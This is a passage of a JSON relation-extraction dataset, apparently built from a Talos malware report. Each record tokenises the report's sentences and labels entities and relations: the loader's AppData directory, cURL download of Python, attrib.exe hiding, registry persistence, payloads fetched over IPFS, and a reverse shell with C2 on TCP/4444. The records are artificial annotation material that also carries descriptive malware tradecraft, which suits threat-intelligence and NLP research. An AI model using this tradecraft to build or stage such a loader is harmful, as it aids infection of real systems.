"TP", "sent_id": 6, "global_pos": [162, 162], "name": "Python executable", "pos": [8, 10], "index": "16_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [167, 167], "name": "final payload", "pos": [13, 15], "index": "17_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [189, 189], "name": "malware", "pos": [5, 6], "index": "18_0"}], [{"type": "SF", "sent_id": 7, "global_pos": [197, 197], "name": "Windows registry", "pos": [13, 15], "index": "19_0"}]], "labels": [{"r": "RD", "evidence": [0, 1], "h": 0, "t": 2}, {"r": "RD", "evidence": [0, 1], "h": 0, "t": 2}, {"r": "WR", "evidence": [0, 1], "h": 0, "t": 2}, {"r": "CO", "evidence": [0, 1], "h": 0, "t": 1}, {"r": "RD", "evidence": [1], "h": 1, "t": 2}, {"r": "WR", "evidence": [1], "h": 1, "t": 2}, {"r": "CO", "evidence": [1, 2], "h": 1, "t": 3}, {"r": "CO", "evidence": [1, 2, 3, 4], "h": 1, "t": 8}, {"r": "CO", "evidence": [1, 2, 3, 4, 5], "h": 1, "t": 11}, {"r": "CO", "evidence": [1, 2, 3, 4, 5, 6], "h": 1, "t": 15}, {"r": "RD", "evidence": [2], "h": 3, "t": 4}, {"r": "ST", "evidence": [2], "h": 3, "t": 5}, {"r": "RF", "evidence": [2], "h": 3, "t": 5}, {"r": "RD", "evidence": [2, 3], "h": 3, "t": 6}, {"r": "CO", "evidence": [2, 3], "h": 4, "t": 6}, {"r": "CO", "evidence": [2, 3], "h": 4, "t": 7}, {"r": "RD", "evidence": [4], "h": 8, "t": 9}, {"r": "CO", "evidence": [4], "h": 9, "t": 10}, {"r": "FR", "evidence": [5], "h": 11, "t": 12}, {"r": "CD", "evidence": [5], "h": 12, "t": 13}, {"r": "CD", "evidence": [5], "h": 12, "t": 14}, {"r": "FR", "evidence": [6], "h": 15, "t": 16}, {"r": "EX", "evidence": [5, 6], "t": 13, "h": 16}, {"r": "RD", "evidence": [6], "h": 16, "t": 17}, {"r": "RD", "evidence": [7], "h": 18, "t": 19}, {"r": "WR", "evidence": [7], "h": 18, "t": 19}]}, {"title": "002-8", "sents": [["When", "executed", ",", "the", "loader", "first", "creates", "a", "directory", "structure", "within", "%", "APPDATA", "%", ",", "using", "a", "command", "line", "syntax", ":", "C", ":", "\\Windows\\system32\\cmd.exe", "/c", "cd", "%", "appdata", "%", "\\Microsoft", "&", "&", "mkdir", "Network", "."], ["The", "malware", "then", "attempts", "to", "download", "Python", "3.10", "from", "the", "software", "provider", "using", "the", "cURL", "command", "."], ["Once", "the", "ZIP", "archive", "has", "been", "retrieved", ",", "it", "is", "unzipped", "and", "stored", "in", "the", "previously", "created", "directory", "using", "the", "PowerShell", "``", "Expand-Archive", "''", "cmdlet", "."], ["The", "malware", "also", "retrieves", "the", "final", "payload", "in", "the", "infection", "chain", "and", "stores", "it", "within", "the", "Network", "directory", "using", "the", "filename", "``", "Packages.txt", "''", "."], ["The", "loader", "then", "uses", "the", "attrib.exe", "utility", "to", "set", "the", "System", "and", "Hidden", "flags", "on", "the", "previously", "created", "directory", ",", "as", "well", "as", "the", "Python", "ZIP", "archive", "and", "final", "payload", "that", "was", "retrieved", "."], ["Finally", ",", "the", "loader", "invokes", "the", "newly", "downloaded", "Python", "executable", "and", "passes", "the", "final", "payload", "as", "a", "command", "line", "argument", ",", "executing", "the", "next", "stage", "of", "the", "infection", "process", "."], ["In", "some", "cases", ",", "the", "malware", "achieves", "persistence", "by", "adding", "entries", "into", "the", "Windows", "registry", "."], ["During", "our", "analysis", "of", "the", "loader-associated", "samples", ",", "we", "discovered", "that", "the", "IPFS", "gateway", "used", "was", "no", "longer", "active", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [4, 4], "name": "loader", "pos": [4, 5], "index": "0_0"}], [{"type": "SF", "sent_id": 0, "global_pos": [11, 11], "name": "% APPDATA %", "pos": [11, 14], "index": "1_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [36, 36], "name": "malware", "pos": [1, 2], "index": "2_0"}], [{"type": "TF", "sent_id": 1, "global_pos": [41, 41], "name": "Python 3.10", "pos": [6, 8], "index": "3_0"}], [{"type": "SO", "sent_id": 1, "global_pos": [45, 45], "name": "software provider", "pos": [10, 12], "index": "4_0"}], [{"type": "TF", "sent_id": 2, "global_pos": [54, 54], "name": "ZIP archive", "pos": [2, 4], "index": "5_0"}], [{"type": "TF", "sent_id": 2, "global_pos": [60, 60], "name": "it", "pos": [8, 9], "index": "6_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [79, 79], "name": "malware", "pos": [1, 2], "index": "7_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [83, 83], "name": "final payload", "pos": [5, 7], "index": "8_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [91, 91], "name": "it", "pos": [13, 14], "index": "9_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [104, 104], "name": "loader", "pos": [1, 2], "index": "10_0"}], [{"type": "TP", "sent_id": 4, "global_pos": [108, 108], "name": "attrib.exe", "pos": [5, 6], "index": "11_0"}], [{"type": "TF", "sent_id": 4, "global_pos": [127, 127], "name": "Python ZIP archive", "pos": [24, 27], "index": "12_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [131, 131], "name": "final payload", "pos": [28, 30], "index": "13_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [140, 140], "name": "loader", "pos": [3, 4], "index": "14_0"}], [{"type": "TP", "sent_id": 5, "global_pos": [145, 145], "name": "Python executable", "pos": [8, 10], "index": "15_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [150, 150], "name": "final payload", "pos": [13, 15], "index": "16_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [172, 172], "name": "malware", "pos": [5, 6], "index": "17_0"}], [{"type": "SF", "sent_id": 6, "global_pos": [180, 180], "name": "Windows registry", "pos": [13, 15], "index": "18_0"}], [{"type": "SO", "sent_id": 7, "global_pos": [195, 195], "name": "IPFS gateway", "pos": [12, 14], "index": "19_0"}]], "labels": [{"r": "RD", "evidence": [0], "h": 0, "t": 1}, {"r": "WR", "evidence": [0], "h": 0, "t": 1}, {"r": "CO", "evidence": [0, 1], "h": 0, "t": 2}, {"r": "CO", "evidence": [0, 1, 2, 3], "h": 0, "t": 7}, {"r": "CO", "evidence": [0, 1, 2, 3, 4], "h": 0, "t": 10}, {"r": "CO", "evidence": [0, 1, 2, 3, 4, 5], "h": 0, "t": 14}, {"r": "RD", "evidence": [1], "h": 2, "t": 3}, {"r": "ST", "evidence": [1], "h": 2, "t": 4}, {"r": "RF", "evidence": [1], "h": 2, "t": 4}, {"r": "RD", "evidence": [1, 2], "h": 2, "t": 5}, {"r": "CO", "evidence": [1, 2], "h": 3, "t": 5}, {"r": "CO", "evidence": [1, 2], "h": 3, "t": 6}, {"r": "RD", "evidence": [3], "h": 7, "t": 8}, {"r": "CO", "evidence": [3], "h": 8, "t": 9}, {"r": "FR", "evidence": [4], "h": 10, "t": 11}, {"r": "CD", "evidence": [4], "h": 11, "t": 12}, {"r": "CD", "evidence": [4], "h": 11, "t": 13}, {"r": "FR", "evidence": [5], "h": 14, "t": 15}, {"r": "EX", "evidence": [4, 5], "t": 12, "h": 15}, {"r": "RD", "evidence": [5], "h": 15, "t": 16}, {"r": "RD", "evidence": [6], "h": 17, "t": 18}, {"r": "WR", "evidence": [6], "h": 17, "t": 18}, {"r": "ST", "evidence": [6, 7], "h": 17, "t": 19}, {"r": "RF", "evidence": [6, 7], "h": 17, "t": 19}]}, {"title": "002-9", "sents": [["The", "malware", "then", "attempts", "to", "download", "Python", "3.10", "from", "the", "software", "provider", "using", "the", "cURL", "command", "."], ["Once", "the", "ZIP", "archive", "has", "been", "retrieved", ",", "it", "is", "unzipped", "and", "stored", "in", "the", "previously", "created", "directory", "using", "the", "PowerShell", "``", "Expand-Archive", "''", "cmdlet", "."], ["The", "malware", "also", "retrieves", "the", "final", "payload", "in", "the", "infection", "chain", "and", "stores", "it", "within", "the", "Network", "directory", "using", "the", "filename", "``", "Packages.txt", "''", "."], ["The", "loader", "then", "uses", "the", "attrib.exe", "utility", "to", "set", "the", "System", "and", "Hidden", "flags", "on", "the", "previously", "created", "directory", ",", "as", "well", "as", "the", "Python", "ZIP", "archive", "and", "final", "payload", "that", "was", "retrieved", "."], ["Finally", ",", "the", "loader", "invokes", "the", "newly", "downloaded", "Python", "executable", "and", "passes", "the", "final", "payload", "as", "a", "command", "line", "argument", ",", "executing", "the", "next", "stage", "of", "the", "infection", "process", "."], ["In", "some", "cases", ",", "the", "malware", "achieves", "persistence", "by", "adding", "entries", "into", "the", "Windows", "registry", "."], ["During", "our", "analysis", "of", "the", "loader-associated", "samples", ",", "we", "discovered", "that", "the", "IPFS", "gateway", "used", "was", "no", "longer", "active", "."], ["However", ",", "Talos", "manually", "retrieved", "and", "analyzed", "the", "next-stage", "payloads", "from", "another", "IPFS", "gateway", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [1, 1], "name": "malware", "pos": [1, 2], "index": "0_0"}], [{"type": "TF", "sent_id": 0, "global_pos": [6, 6], "name": "Python 3.10", "pos": [6, 8], "index": "1_0"}], [{"type": "SO", "sent_id": 0, "global_pos": [10, 10], "name": "software provider", "pos": [10, 12], "index": "2_0"}], [{"type": "TF", "sent_id": 1, "global_pos": [19, 19], "name": "ZIP archive", "pos": [2, 4], "index": "3_0"}], [{"type": "TF", "sent_id": 1, "global_pos": [25, 25], "name": "it", "pos": [8, 9], "index": "4_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [44, 44], "name": "malware", "pos": [1, 2], "index": "5_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [48, 48], "name": "final payload", "pos": [5, 7], "index": "6_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [56, 56], "name": "it", "pos": [13, 14], "index": "7_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [69, 69], "name": "loader", "pos": [1, 2], "index": "8_0"}], [{"type": "TP", "sent_id": 3, "global_pos": [73, 73], "name": "attrib.exe", "pos": [5, 6], "index": "9_0"}], [{"type": "TF", "sent_id": 3, "global_pos": [92, 92], "name": "Python ZIP archive", "pos": [24, 27], "index": "10_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [96, 96], "name": "final payload", "pos": [28, 30], "index": "11_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [105, 105], "name": "loader", "pos": [3, 4], "index": "12_0"}], [{"type": "TP", "sent_id": 4, "global_pos": [110, 110], "name": "Python executable", "pos": [8, 10], "index": "13_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [115, 115], "name": "final payload", "pos": [13, 15], "index": "14_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [137, 137], "name": "malware", "pos": [5, 6], "index": "15_0"}], [{"type": "SF", "sent_id": 5, "global_pos": [145, 145], "name": "Windows registry", "pos": [13, 15], "index": "16_0"}], [{"type": "SO", "sent_id": 6, "global_pos": [160, 160], "name": "IPFS gateway", "pos": [12, 14], "index": "17_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [170, 170], "name": "Talos", "pos": [2, 3], "index": "18_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [177, 177], "name": "payloads", "pos": [9, 10], "index": "19_0"}], [{"type": "SO", "sent_id": 7, "global_pos": [180, 180], "name": "IPFS gateway", "pos": [12, 14], "index": "20_0"}]], "labels": [{"r": "RD", "evidence": [0], "h": 0, "t": 1}, {"r": "ST", "evidence": [0], "h": 0, "t": 2}, {"r": "RF", "evidence": [0], "h": 0, "t": 2}, {"r": "RD", "evidence": [0, 1], "h": 0, "t": 3}, {"r": "CO", "evidence": [0, 1], "h": 1, "t": 3}, {"r": "CO", "evidence": [0, 1], "h": 1, "t": 4}, {"r": "RD", "evidence": [2], "h": 5, "t": 6}, {"r": "CO", "evidence": [2], "h": 6, "t": 7}, {"r": "FR", "evidence": [3], "h": 8, "t": 9}, {"r": "CD", "evidence": [3], "h": 9, "t": 10}, {"r": "CD", "evidence": [3], "h": 9, "t": 11}, {"r": "FR", "evidence": [4], "h": 12, "t": 13}, {"r": "EX", "evidence": [3, 4], "t": 10, "h": 13}, {"r": "RD", "evidence": [4], "h": 13, "t": 14}, {"r": "RD", "evidence": [5], "h": 15, "t": 16}, {"r": "WR", "evidence": [5], "h": 15, "t": 16}, {"r": "ST", "evidence": [5, 6], "h": 15, "t": 17}, {"r": "RF", "evidence": [5, 6], "h": 15, "t": 17}, {"r": "ST", "evidence": [6, 7], "t": 17, "h": 18}, {"r": "RF", "evidence": [6, 7], "t": 17, "h": 18}, {"r": "RD", "evidence": [7], "h": 18, "t": 19}, {"r": "WR", "evidence": [7], "h": 18, "t": 19}, {"r": "ST", "evidence": [7], "h": 18, "t": 20}, {"r": "RF", "evidence": [7], "h": 18, "t": 20}]}, {"title": "002-10", "sents": [["Once", "the", "ZIP", "archive", "has", "been", "retrieved", ",", "it", "is", "unzipped", "and", "stored", "in", "the", "previously", "created", "directory", "using", "the", "PowerShell", "``", "Expand-Archive", "''", "cmdlet", "."], ["The", "malware", "also", "retrieves", "the", "final", "payload", "in", "the", "infection", "chain", "and", "stores", "it", "within", "the", "Network", "directory", "using", "the", "filename", "``", "Packages.txt", "''", "."], ["The", "loader", "then", "uses", "the", "attrib.exe", "utility", "to", "set", "the", "System", "and", "Hidden", "flags", "on", "the", "previously", "created", "directory", ",", "as", "well", "as", "the", "Python", "ZIP", "archive", "and", "final", "payload", "that", "was", "retrieved", "."], ["Finally", ",", "the", "loader", "invokes", "the", "newly", "downloaded", "Python", "executable", "and", "passes", "the", "final", "payload", "as", "a", "command", "line", "argument", ",", "executing", "the", "next", "stage", "of", "the", "infection", "process", "."], ["In", "some", "cases", ",", "the", "malware", "achieves", "persistence", "by", "adding", "entries", "into", "the", "Windows", "registry", "."], ["During", "our", "analysis", "of", "the", "loader-associated", "samples", ",", "we", "discovered", "that", "the", "IPFS", "gateway", "used", "was", "no", "longer", "active", "."], ["However", ",", "Talos", "manually", "retrieved", "and", "analyzed", "the", "next-stage", "payloads", "from", "another", "IPFS", "gateway", "."], ["In", "one", "of", "the", "clusters", "using", "this", "loader", ",", "a", "Python", "script", "containing", "a", "large", "base64", "encoded", "blob", "along", "with", "the", "Python", "code", "for", "decoding", "it", "was", "hosted", "within", "the", "IPFS", "network", "."]], "vertexSet": [[{"type": "TF", "sent_id": 0, "global_pos": [2, 2], "name": "ZIP archive", "pos": [2, 4], "index": "0_0"}], [{"type": "TF", "sent_id": 0, "global_pos": [8, 8], "name": "it", "pos": [8, 9], "index": "1_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [27, 27], "name": "malware", "pos": [1, 2], "index": "2_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [31, 31], "name": "final payload", "pos": [5, 7], "index": "3_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [39, 39], "name": "it", "pos": [13, 14], "index": "4_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [52, 52], "name": "loader", "pos": [1, 2], "index": "5_0"}], [{"type": "TP", "sent_id": 2, "global_pos": [56, 56], "name": "attrib.exe", "pos": [5, 6], "index": "6_0"}], [{"type": "TF", "sent_id": 2, "global_pos": [75, 75], "name": "Python ZIP archive", "pos": [24, 27], "index": "7_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [79, 79], "name": "final payload", "pos": [28, 30], "index": "8_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [88, 88], "name": "loader", "pos": [3, 4], "index": "9_0"}], [{"type": "TP", "sent_id": 3, "global_pos": [93, 93], "name": "Python executable", "pos": [8, 10], "index": "10_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [98, 98], "name": "final payload", "pos": [13, 15], "index": "11_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [120, 120], "name": "malware", "pos": [5, 6], "index": "12_0"}], [{"type": "SF", "sent_id": 4, "global_pos": [128, 128], "name": "Windows registry", "pos": [13, 15], "index": "13_0"}], [{"type": "SO", "sent_id": 5, "global_pos": [143, 143], "name": "IPFS gateway", "pos": [12, 14], "index": "14_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [153, 153], "name": "Talos", "pos": [2, 3], "index": "15_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [160, 160], "name": "payloads", "pos": [9, 10], "index": "16_0"}], [{"type": "SO", "sent_id": 6, "global_pos": [163, 163], "name": "IPFS gateway", "pos": [12, 14], "index": "17_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [173, 173], "name": "loader", "pos": [7, 8], "index": "18_0"}], [{"type": "SO", "sent_id": 7, "global_pos": [196, 196], "name": "IPFS network", "pos": [30, 32], "index": "19_0"}]], "labels": [{"r": "RD", "evidence": [1], "h": 2, "t": 3}, {"r": "CO", "evidence": [1], "h": 3, "t": 4}, {"r": "FR", "evidence": [2], "h": 5, "t": 6}, {"r": "CD", "evidence": [2], "h": 6, "t": 7}, {"r": "CD", "evidence": [2], "h": 6, "t": 8}, {"r": "FR", "evidence": [3], "h": 9, "t": 10}, {"r": "EX", "evidence": [2, 3], "t": 7, "h": 10}, {"r": "RD", "evidence": [3], "h": 10, "t": 11}, {"r": "RD", "evidence": [4], "h": 12, "t": 13}, {"r": "WR", "evidence": [4], "h": 12, "t": 13}, {"r": "ST", "evidence": [4, 5], "h": 12, "t": 14}, {"r": "RF", "evidence": [4, 5], "h": 12, "t": 14}, {"r": "ST", "evidence": [5, 6], "t": 14, "h": 15}, {"r": "RF", "evidence": [5, 6], "t": 14, "h": 15}, {"r": "RD", "evidence": [6], "h": 15, "t": 16}, {"r": "WR", "evidence": [6], "h": 15, "t": 16}, {"r": "ST", "evidence": [6], "h": 15, "t": 17}, {"r": "RF", "evidence": [6], "h": 15, "t": 17}, {"r": "RD", "evidence": [6, 7], "t": 16, "h": 18}, {"r": "ST", "evidence": [7], "h": 18, "t": 19}, {"r": "RF", "evidence": [7], "h": 18, "t": 19}, {"r": "ST", "evidence": [7], "h": 18, "t": 19}, {"r": "RF", "evidence": [7], "h": 18, "t": 19}]}, {"title": "002-11", "sents": [["The", "malware", "also", "retrieves", "the", "final", "payload", "in", "the", "infection", "chain", "and", "stores", "it", "within", "the", "Network", "directory", "using", "the", "filename", "``", "Packages.txt", "''", "."], ["The", "loader", "then", "uses", "the", "attrib.exe", "utility", "to", "set", "the", "System", "and", "Hidden", "flags", "on", "the", "previously", "created", "directory", ",", "as", "well", "as", "the", "Python", "ZIP", "archive", "and", "final", "payload", "that", "was", "retrieved", "."], ["Finally", ",", "the", "loader", "invokes", "the", "newly", "downloaded", "Python", "executable", "and", "passes", "the", "final", "payload", "as", "a", "command", "line", "argument", ",", "executing", "the", "next", "stage", "of", "the", "infection", "process", "."], ["In", "some", "cases", ",", "the", "malware", "achieves", "persistence", "by", "adding", "entries", "into", "the", "Windows", "registry", "."], ["During", "our", "analysis", "of", "the", "loader-associated", "samples", ",", "we", "discovered", "that", "the", "IPFS", "gateway", "used", "was", "no", "longer", "active", "."], ["However", ",", "Talos", "manually", "retrieved", "and", "analyzed", "the", "next-stage", "payloads", "from", "another", "IPFS", "gateway", "."], ["In", "one", "of", "the", "clusters", "using", "this", "loader", ",", "a", "Python", "script", "containing", "a", "large", "base64", "encoded", "blob", "along", "with", "the", "Python", "code", "for", "decoding", "it", "was", "hosted", "within", "the", "IPFS", "network", "."], ["After", "decoding", "all", "layers", ",", "the", "deobfuscated", "reverse", "shell", "payload", "was", "obtained", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [1, 1], "name": "malware", "pos": [1, 2], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [5, 5], "name": "final payload", "pos": [5, 7], "index": "1_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [13, 13], "name": "it", "pos": [13, 14], "index": "2_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [26, 26], "name": "loader", "pos": [1, 2], "index": "3_0"}], [{"type": "TP", "sent_id": 1, "global_pos": [30, 30], "name": "attrib.exe", "pos": [5, 6], "index": "4_0"}], [{"type": "TF", "sent_id": 1, "global_pos": [49, 49], "name": "Python ZIP archive", "pos": [24, 27], "index": "5_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [53, 53], "name": "final payload", "pos": [28, 30], "index": "6_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [62, 62], "name": "loader", "pos": [3, 4], "index": "7_0"}], [{"type": "TP", "sent_id": 2, "global_pos": [67, 67], "name": "Python executable", "pos": [8, 10], "index": "8_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [72, 72], "name": "final payload", "pos": [13, 15], "index": "9_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [94, 94], "name": "malware", "pos": [5, 6], "index": "10_0"}], [{"type": "SF", "sent_id": 3, "global_pos": [102, 102], "name": "Windows registry", "pos": [13, 15], "index": "11_0"}], [{"type": "SO", "sent_id": 4, "global_pos": [117, 117], "name": "IPFS gateway", "pos": [12, 14], "index": "12_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [127, 127], "name": "Talos", "pos": [2, 3], "index": "13_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [134, 134], "name": "payloads", "pos": [9, 10], "index": "14_0"}], [{"type": "SO", "sent_id": 5, "global_pos": [137, 137], "name": "IPFS gateway", "pos": [12, 14], "index": "15_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [147, 147], "name": "loader", "pos": [7, 8], "index": "16_0"}], [{"type": "SO", "sent_id": 6, "global_pos": [170, 170], "name": "IPFS network", "pos": [30, 32], "index": "17_0"}]], "labels": [{"r": "RD", "evidence": [0], "h": 0, "t": 1}, {"r": "CO", "evidence": [0], "h": 1, "t": 2}, {"r": "FR", "evidence": [1], "h": 3, "t": 4}, {"r": "CD", "evidence": [1], "h": 4, "t": 5}, {"r": "CD", "evidence": [1], "h": 4, "t": 6}, {"r": "FR", "evidence": [2], "h": 7, "t": 8}, {"r": "EX", "evidence": [1, 2], "t": 5, "h": 8}, {"r": "RD", "evidence": [2], "h": 8, "t": 9}, {"r": "RD", "evidence": [3], "h": 10, "t": 11}, {"r": "WR", "evidence": [3], "h": 10, "t": 11}, {"r": "ST", "evidence": [3, 4], "h": 10, "t": 12}, {"r": "RF", "evidence": [3, 4], "h": 10, "t": 12}, {"r": "ST", "evidence": [4, 5], "t": 12, "h": 13}, {"r": "RF", "evidence": [4, 5], "t": 12, "h": 13}, {"r": "RD", "evidence": [5], "h": 13, "t": 14}, {"r": "WR", "evidence": [5], "h": 13, "t": 14}, {"r": "ST", "evidence": [5], "h": 13, "t": 15}, {"r": "RF", "evidence": [5], "h": 13, "t": 15}, {"r": "RD", "evidence": [5, 6], "t": 14, "h": 16}, {"r": "ST", "evidence": [6], "h": 16, "t": 17}, {"r": "RF", "evidence": [6], "h": 16, "t": 17}, {"r": "ST", "evidence": [6], "h": 16, "t": 17}, {"r": "RF", "evidence": [6], "h": 16, "t": 17}]}, {"title": "002-12", "sents": [["The", "loader", "then", "uses", "the", "attrib.exe", "utility", "to", "set", "the", "System", "and", "Hidden", "flags", "on", "the", "previously", "created", "directory", ",", "as", "well", "as", "the", "Python", "ZIP", "archive", "and", "final", "payload", "that", "was", "retrieved", "."], ["Finally", ",", "the", "loader", "invokes", "the", "newly", "downloaded", "Python", "executable", "and", "passes", "the", "final", "payload", "as", "a", "command", "line", "argument", ",", "executing", "the", "next", "stage", "of", "the", "infection", "process", "."], ["In", "some", "cases", ",", "the", "malware", "achieves", "persistence", "by", "adding", "entries", "into", "the", "Windows", "registry", "."], ["During", "our", "analysis", "of", "the", "loader-associated", "samples", ",", "we", "discovered", "that", "the", "IPFS", "gateway", "used", "was", "no", "longer", "active", "."], ["However", ",", "Talos", "manually", "retrieved", "and", "analyzed", "the", "next-stage", "payloads", "from", "another", "IPFS", "gateway", "."], ["In", "one", "of", "the", "clusters", "using", "this", "loader", ",", "a", "Python", "script", "containing", "a", "large", "base64", "encoded", "blob", "along", "with", "the", "Python", "code", "for", "decoding", "it", "was", "hosted", "within", "the", "IPFS", "network", "."], ["After", "decoding", "all", "layers", ",", "the", "deobfuscated", "reverse", "shell", "payload", "was", "obtained", "."], ["At", "the", "time", "of", "analysis", ",", "the", "C2", "server", "was", "not", "operational", "on", "TCP/4444", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [1, 1], "name": "loader", "pos": [1, 2], "index": "0_0"}], [{"type": "TP", "sent_id": 0, "global_pos": [5, 5], "name": "attrib.exe", "pos": [5, 6], "index": "1_0"}], [{"type": "TF", "sent_id": 0, "global_pos": [24, 24], "name": "Python ZIP archive", "pos": [24, 27], "index": "2_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [28, 28], "name": "final payload", "pos": [28, 30], "index": "3_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [37, 37], "name": "loader", "pos": [3, 4], "index": "4_0"}], [{"type": "TP", "sent_id": 1, "global_pos": [42, 42], "name": "Python executable", "pos": [8, 10], "index": "5_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [47, 47], "name": "final payload", "pos": [13, 15], "index": "6_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [69, 69], "name": "malware", "pos": [5, 6], "index": "7_0"}], [{"type": "SF", "sent_id": 2, "global_pos": [77, 77], "name": "Windows registry", "pos": [13, 15], "index": "8_0"}], [{"type": "SO", "sent_id": 3, "global_pos": [92, 92], "name": "IPFS gateway", "pos": [12, 14], "index": "9_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [102, 102], "name": "Talos", "pos": [2, 3], "index": "10_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [109, 109], "name": "payloads", "pos": [9, 10], "index": "11_0"}], [{"type": "SO", "sent_id": 4, "global_pos": [112, 112], "name": "IPFS gateway", "pos": [12, 14], "index": "12_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [122, 122], "name": "loader", "pos": [7, 8], "index": "13_0"}], [{"type": "SO", "sent_id": 5, "global_pos": [145, 145], "name": "IPFS network", "pos": [30, 32], "index": "14_0"}]], "labels": [{"r": "FR", "evidence": [0], "h": 0, "t": 1}, {"r": "CD", "evidence": [0], "h": 1, "t": 2}, {"r": "CD", "evidence": [0], "h": 1, "t": 3}, {"r": "FR", "evidence": [1], "h": 4, "t": 5}, {"r": "EX", "evidence": [0, 1], "t": 2, "h": 5}, {"r": "RD", "evidence": [1], "h": 5, "t": 6}, {"r": "RD", "evidence": [2], "h": 7, "t": 8}, {"r": "WR", "evidence": [2], "h": 7, "t": 8}, {"r": "ST", "evidence": [2, 3], "h": 7, "t": 9}, {"r": "RF", "evidence": [2, 3], "h": 7, "t": 9}, {"r": "ST", "evidence": [3, 4], "t": 9, "h": 10}, {"r": "RF", "evidence": [3, 4], "t": 9, "h": 10}, {"r": "RD", "evidence": [4], "h": 10, "t": 11}, {"r": "WR", "evidence": [4], "h": 10, "t": 11}, {"r": "ST", "evidence": [4], "h": 10, "t": 12}, {"r": "RF", "evidence": [4], "h": 10, "t": 12}, {"r": "RD", "evidence": [4, 5], "t": 11, "h": 13}, {"r": "ST", "evidence": [5], "h": 13, "t": 14}, {"r": "RF", "evidence": [5], "h": 13, "t": 14}, {"r": "ST", "evidence": [5], "h": 13, "t": 14}, {"r": "RF", "evidence": [5], "h": 13, "t": 14}]}, {"title": "002-13", "sents": [["Finally", ",", "the", "loader", "invokes", "the", "newly", "downloaded", "Python", "executable", "and", "passes", "the", "final", "payload", "as", "a", "command", "line", "argument", ",", "executing", "the", "next", "stage", "of", "the", "infection", "process", "."], ["In", "some", "cases", ",", "the", "malware", "achieves", "persistence", "by", "adding", "entries", "into", "the", "Windows", "registry", "."], ["During", "our", "analysis", "of", "the", "loader-associated", "samples", ",", "we", "discovered", "that", "the", "IPFS", "gateway", "used", "was", "no", "longer", "active", "."], ["However", ",", "Talos", "manually", "retrieved", "and", "analyzed", "the", "next-stage", "payloads", "from", "another", "IPFS", "gateway", "."], ["In", "one", "of", "the", "clusters", "using", "this", "loader", ",", "a", "Python", "script", "containing", "a", "large", "base64", "encoded", "blob", "along", "with", "the", "Python", "code", "for", "decoding", "it", "was", "hosted", "within", "the", "IPFS", "network", "."], ["After", "decoding", "all", "layers", ",", "the", "deobfuscated", "reverse", "shell", "payload", "was", "obtained", "."], ["At", "the", "time", "of", "analysis", ",", "the", "C2", "server", "was", "not", "operational", "on", "TCP/4444", "."], ["In", "another", "cluster", ",", "we", "observed", "that", "the", "final", "payload", "stored", "in", "IPFS", "was", "a", "Windows", "batch", "file", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [3, 3], "name": "loader", "pos": [3, 4], "index": "0_0"}], [{"type": "TP", "sent_id": 0, "global_pos": [8, 8], "name": "Python executable", "pos": [8, 10], "index": "1_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [13, 13], "name": "final payload", "pos": [13, 15], "index": "2_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [35, 35], "name": "malware", "pos": [5, 6], "index": "3_0"}], [{"type": "SF", "sent_id": 1, "global_pos": [43, 43], "name": "Windows registry", "pos": [13, 15], "index": "4_0"}], [{"type": "SO", "sent_id": 2, "global_pos": [58, 58], "name": "IPFS gateway", "pos": [12, 14], "index": "5_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [68, 68], "name": "Talos", "pos": [2, 3], "index": "6_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [75, 75], "name": "payloads", "pos": [9, 10], "index": "7_0"}], [{"type": "SO", "sent_id": 3, "global_pos": [78, 78], "name": "IPFS gateway", "pos": [12, 14], "index": "8_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [88, 88], "name": "loader", "pos": [7, 8], "index": "9_0"}], 